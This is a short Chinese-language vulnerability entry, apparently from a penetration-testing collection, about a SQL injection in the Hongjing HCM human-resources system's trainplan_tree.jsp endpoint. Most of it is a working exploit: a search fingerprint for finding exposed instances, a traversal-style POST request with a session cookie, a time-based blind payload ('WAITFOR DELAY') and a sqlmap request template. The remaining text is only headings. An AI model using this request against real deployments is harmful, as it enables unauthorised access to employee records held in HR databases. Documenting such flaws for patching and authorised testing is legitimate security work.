# 宏景人力资源信息管理系统trainplan_tree存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`POST /templates/attestation/../../train/traincourse/trainplan_tree.jsp HTTP/1.1`
- **关键头**：`Content-Length: 33`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: JSESSIONID=9D80A8469FF7D54C91A7B7C262C915FE`

**请求体 / payload**
```
classId=1;WAITFOR DELAY '0:0:5'--

sqlmap
POST /templates/attestation/../../train/traincourse/trainplan_tree.jsp HTTP/1.1
Host:
Content-Length: 33
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=9D80A8469FF7D54C91A7B7C262C915FE
classId=1

\[宏景ehr-trainplan-tree-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 宏景人力资源信息管理系统trainplan\_tree存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统